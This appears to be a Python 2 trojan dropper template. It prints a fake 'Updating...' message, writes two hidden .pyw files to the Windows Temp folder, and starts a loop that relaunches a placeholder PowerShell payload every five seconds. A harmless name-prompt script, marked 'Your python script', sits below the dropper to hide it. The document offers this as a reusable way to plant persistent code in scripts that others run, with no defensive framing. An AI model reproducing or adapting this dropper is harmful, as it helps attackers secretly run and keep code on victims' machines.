import os
import time
import urllib
import subprocess

print "Updating..."
back = open("C:\Windows\Temp\sss.pyw", "w")
back.write("import subprocess")
back.write("\n")
back.write("subprocess.Popen(' POWERSHELL SRC CODE',  shell=True)") #powershell source
back.close()
arquivo = open("C:\Windows\Temp\ss.pyw", "w")
arquivo.write("import time")
arquivo.write("\n")
arquivo.write("import subprocess")
arquivo.write("\n")
arquivo.write("time.sleep(2)")
arquivo.write("\n")
arquivo.write("xa = 1")
arquivo.write("\n")
arquivo.write("while xa == 1:")
arquivo.write("\n")
arquivo.write('	subprocess.Popen("C:\Windows\Temp\sss.pyw", shell=True)')
arquivo.write("\n")
arquivo.write("	time.sleep(5)")
arquivo.write("\n")
arquivo.close()
time.sleep(1)
subprocess.Popen("C:\Windows\Temp\ss.pyw", shell=True)

#Your python script
print "Hello"
name = raw_input("What is your name?")
print "Your name is %s" %(name)
